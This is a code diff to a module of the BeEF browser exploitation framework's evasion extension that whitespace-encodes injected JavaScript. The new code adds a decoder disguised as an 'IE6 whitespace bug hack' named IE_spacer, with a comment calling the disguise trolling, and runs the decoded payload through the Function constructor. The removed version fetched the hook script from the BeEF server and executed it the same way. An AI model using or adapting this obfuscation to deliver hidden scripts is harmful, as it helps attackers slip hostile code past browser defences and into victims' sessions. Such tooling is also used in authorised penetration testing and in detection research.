@@ -20,56 +20,40 @@ module BeEF
         include Singleton
 
         def need_bootstrap
-          false
+          true
+        end
+        
+        def get_bootstrap
+        # the decode function is in plain text - called IE-spacer - because trolling is always a good idea
+        decode_function =
+"//Dirty IE6 whitespace bug hack
+function IE_spacer(css_space) {
+  var spacer = '';
+  for(y = 0; y < css_space.length/8; y++)
+  {
+    v = 0;
+    for(x = 0; x < 8; x++)
+    {
+      if(css_space.charCodeAt(x+(y*8)) > 9)
+      {
+        v++;
+      }
+      if(x != 7)
+      {
+        v = v << 1;
+      }
+    }
+    spacer += String.fromCharCode(v);
+  }return spacer;
+}"
         end
 
         def execute(input, config)
-          print_debug input.length
+          size = input.length
           encoded = encode(input)
-	        var_name = BeEF::Extension::Evasion::Helper::random_string(3)
-
-          config = BeEF::Core::Configuration.instance
-          hook = config.get("beef.http.hook_file")
-          host = config.get("beef.http.host")
-          port = config.get("beef.http.port")
-          decode_function =
-"
-//Dirty IE6 whitespace bug hack
-#{var_name} = function (){
-  jQuery.get(\'http://#{host}:#{port}#{hook}\', function callback(data) {
-    var output = '';
-    var str = '//E'+'OH';
-    var chunks = data.split(str);
-    for (var i = 0; i < chunks.length; i++)
-    {
-      if(chunks[i].substring(0,4)  == '----')
-      {
-        input = chunks[i].split('\\n');
-        input = input[0].substring(5);
-        for(y = 0; y < input.length/8; y++)
-        {
-          v = 0;
-          for(x = 0; x < 8; x++)
-          {
-	          if(input.charCodeAt(x+(y*8)) > 9)
-	          {
-		          v++;
-	          }
-	          if(x != 7)
-	          {
-		          v = v << 1;
-	          }
-          }
-          output += String.fromCharCode(v);
-        }
-      }
-    }alert(output.length);[].constructor.constructor(output)();
-  }, 'text');
-}
-#{var_name}();//EOH-----"
-
-	        input = "#{decode_function}#{encoded}"
-          print_debug "[OBFUSCATION - WHITESPACE] Javascript has been Whitespace Encoded"
+          var_name = BeEF::Extension::Evasion::Helper::random_string(3)
+          input = "var #{var_name}=\"#{encoded}\";[].constructor.constructor(IE_spacer(#{var_name}))();"
+          print_debug "[OBFUSCATION - WHITESPACE] #{size}byte of Javascript code has been Whitespaced"
           input
         end
 
